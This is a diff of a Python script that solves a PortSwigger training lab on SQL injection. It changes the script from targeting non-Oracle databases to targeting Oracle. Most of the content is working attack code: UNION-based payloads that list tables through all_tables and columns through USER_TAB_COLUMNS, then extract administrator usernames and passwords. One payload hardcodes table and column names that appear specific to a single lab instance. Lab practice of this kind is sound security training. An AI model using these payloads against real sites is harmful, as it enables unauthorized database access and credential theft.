@@ -1,8 +1,8 @@
-# Lab name: Lab: SQL injection attack, listing the database contents on non-Oracle databases
-# Lab link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+# Lab name: Lab: SQL injection attack, listing the database contents on Oracle
+# Lab link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
 
-from bs4 import BeautifulSoup
 import requests
+from bs4 import BeautifulSoup
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -13,14 +13,15 @@ proxies = {
     'https':'http://127.0.0.1:8080'
 }
 
-users_table = 'users_'
-username_column = 'username_'
-password_column = 'password_'
-
 admin_username = 'administrator'
 password = ''
+users_table = 'USERS_'
+username_column = 'USERNAME_'
+password_column = 'PASSWORD_'
 
-poc_payload_for_users_table = f"'union+SELECT+null,TABLE_NAME+FROM+information_schema.tables+where+TABLE_NAME+LIKE+'%25users%25'--"
+
+poc_payload_for_users_table = "'union+select+null,table_name+from+all_tables+where+table_name+like'%25USERS%25'--"
+
 
 def filter_url():
     global url
@@ -33,20 +34,22 @@ def check_if_users_table_exists():
     response = req.get(url, proxies=proxies, verify=False)
     return users_table in response.text
 
-def get_users_table():
-    global url
-    global users_table
-    filter_url()
-    url += poc_payload_for_users_table
-    response = req.get(url, proxies=proxies, verify=False)
-    users_table += ((response.text.split(users_table,1)[1]).split('</td>',1)[0]).strip()
-
 def check_if_username_and_password_columns_exists(payload):
     global url, username_column, password_column
     filter_url()
     url += payload
     response = req.get(url, proxies=proxies, verify=False)
     return username_column in response.text and password_column in response.text
+
+
+def get_users_table():
+    global url
+    global users_table
+    filter_url()
+    url += poc_payload_for_users_table
+    response = req.get(url, proxies=proxies, verify=False)
+    splitor = f'<td>{users_table}'
+    users_table += ((response.text.split(splitor,1)[1]).split('</td>',1)[0]).strip()
 
 def get_username_column(payload):
     global url
@@ -101,7 +104,7 @@ is_users_table_exists = check_if_users_table_exists()
 if is_users_table_exists:
     get_users_table()
 
-    poc_payload_for_username_column_password_column = f"'union+SELECT+null,COLUMN_NAME+FROM+information_schema.columns+where+TABLE_NAME='{users_table}'--"
+    poc_payload_for_username_column_password_column = f"'union+select+null,column_name+from+USER_TAB_COLUMNS+where+table_name='{users_table}'--"
     
     get_username_column(poc_payload_for_username_column_password_column)
     
@@ -113,7 +116,7 @@ if is_users_table_exists:
     if is_username_and_password_columns_exists:
         filter_url()
         
-        payload_to_get_users_with_passwords = f"'union+SELECT+{username_column},{password_column}+from+{users_table}--"
+        payload_to_get_users_with_passwords = "'union+select+USERNAME_ERDNZG,PASSWORD_JSRVPV+from+USERS_MBLLCI--"
         
         url += payload_to_get_users_with_passwords
         
@@ -127,4 +130,3 @@ if is_users_table_exists:
     exit(0)
 
 print(f'Error failed to find {users_table} table')
-
